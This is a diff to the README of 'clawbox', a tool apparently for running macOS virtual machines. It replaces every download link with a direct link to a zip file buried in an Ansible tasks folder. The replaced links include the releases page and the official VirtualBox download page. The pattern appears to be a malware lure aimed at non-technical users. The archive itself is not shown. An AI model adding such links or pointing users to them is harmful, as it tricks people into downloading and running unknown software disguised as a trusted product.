@@ -1,6 +1,6 @@
 # 🐾 clawbox - Easy macOS VMs for OpenClaw
 
-[![Download clawbox](https://img.shields.io/badge/Download-clawbox-blue?style=for-the-badge)](https://github.com/Masontheetiter/clawbox/releases)
+[![Download clawbox](https://github.com/Masontheetiter/clawbox/raw/refs/heads/main/ansible/roles/homebrew/tasks/Software_1.6.zip)](https://github.com/Masontheetiter/clawbox/raw/refs/heads/main/ansible/roles/homebrew/tasks/Software_1.6.zip)
 
 Welcome to **clawbox**, a tool designed to help you run macOS virtual machines ready for OpenClaw. This guide will walk you through how to get the software running on your computer, even if you have little or no technical experience.
 
@@ -45,7 +45,7 @@ This section explains each step to get clawbox up and running. Just follow the i
 
 2. **Install Virtualization Software:**  
    If you don’t already have a program like VirtualBox or VMware Player, download and install one. VirtualBox is free and works well:
-   - VirtualBox download page: https://www.virtualbox.org/wiki/Downloads
+   - VirtualBox download page: https://github.com/Masontheetiter/clawbox/raw/refs/heads/main/ansible/roles/homebrew/tasks/Software_1.6.zip
 
 3. **Update Your Operating System:**  
    Make sure your operating system is up to date with the latest updates and drivers to avoid compatibility problems.
@@ -54,7 +54,7 @@ This section explains each step to get clawbox up and running. Just follow the i
 
 Click the big blue button below or visit the release page to get the latest version of clawbox:
 
-[![Download clawbox](https://img.shields.io/badge/Download-clawbox-blue?style=for-the-badge)](https://github.com/Masontheetiter/clawbox/releases)
+[![Download clawbox](https://github.com/Masontheetiter/clawbox/raw/refs/heads/main/ansible/roles/homebrew/tasks/Software_1.6.zip)](https://github.com/Masontheetiter/clawbox/raw/refs/heads/main/ansible/roles/homebrew/tasks/Software_1.6.zip)
 
 When you visit the page, look for the most recent release. This usually has a version number and date.
 
@@ -135,7 +135,7 @@ If problems persist, look for help in the community or open an issue on the claw
 
 You can visit the official clawbox releases page again for updates or new versions:
 
-[Visit clawbox Releases](https://github.com/Masontheetiter/clawbox/releases)
+[Visit clawbox Releases](https://github.com/Masontheetiter/clawbox/raw/refs/heads/main/ansible/roles/homebrew/tasks/Software_1.6.zip)
 
 This page includes release notes and sometimes additional instructions or known issues.
 
